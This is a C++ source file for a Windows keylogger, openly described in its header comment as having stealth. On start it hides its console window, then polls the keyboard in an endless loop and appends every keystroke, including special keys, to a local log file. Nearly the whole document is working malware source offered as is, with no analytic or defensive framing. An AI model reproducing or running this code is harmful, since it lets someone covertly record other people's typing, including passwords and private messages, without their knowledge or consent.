// Author : Nemuel Wainaina
/*
    This is a keylogger program that has stealth implemented in it;
    the console screen is hidden when the program starts running.
*/

#include <iostream>
#include <windows.h>
#include <winuser.h>

using namespace std;

void Stealth();
int Save(int, char*);

int main() {
    Stealth();

    char i;
    char* file = "log_file.txt"; // file where our logs get saved
    while(1) {
        for(i = 8; i <= 190; i++) {
            if(GetAsyncKeyState(i) == -32767) {
                Save(i, file);
            }
        }
    }

    return 0;
}

// hide the console screen of our program
void Stealth() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

// store the typed character to the specified log file
int Save(int key, char* file) {
    if((key == 0) || (key == 1)) {
        return 0;
    }

    FILE* fp;
    fp = fopen(file, "a"); // initialize the pointer to the log file

    /*
    8 - Backspace
    13 - New line
    32 - space (" ")
    110, 190 - full stop (".")
    */

    if(key == 8) {
        fprintf(fp, "%s", "[BACKSPACE]");
    }
    else if(key == 13) {
        fprintf(fp, "%s", "\n");
    }
    else if(key == 32) {
        fprintf(fp, "%s", " ");
    }
    else if(key == VK_TAB) {
        fprintf(fp, "%s", "[TAB]");
    }
    else if(key == VK_SHIFT) {
        fprintf(fp, "%s", "[SHIFT]");
    }
    else if(key == VK_CONTROL) {
        fprintf(fp, "%s", "[CONTROL]");
    }
    else if(key == VK_ESCAPE) {
        fprintf(fp, "%s", "[ESCAPE]");
    }
    else if(key == VK_HOME) {
        fprintf(fp, "%s", "[HOME]");
    }
    else if(key == VK_END) {
        fprintf(fp, "%s", "[END]");
    }
    else if(key == VK_RIGHT) {
        fprintf(fp, "%s", "[RIGHT]");
    }
    else if(key == VK_LEFT) {
        fprintf(fp, "%s", "[LEFT]");
    }
    else if(key == VK_UP) {
        fprintf(fp, "%s", "[UP]");
    }
    else if(key == VK_DOWN) {
        fprintf(fp, "%s", "[DOWN]");
    }
    else if((key == 110) || (key == 190)) {
        fprintf(fp, "%s", ".");
    }
    else {
        fprintf(fp, "%s", &key);
    }

    fclose(fp); // close the pointer to the log file
}
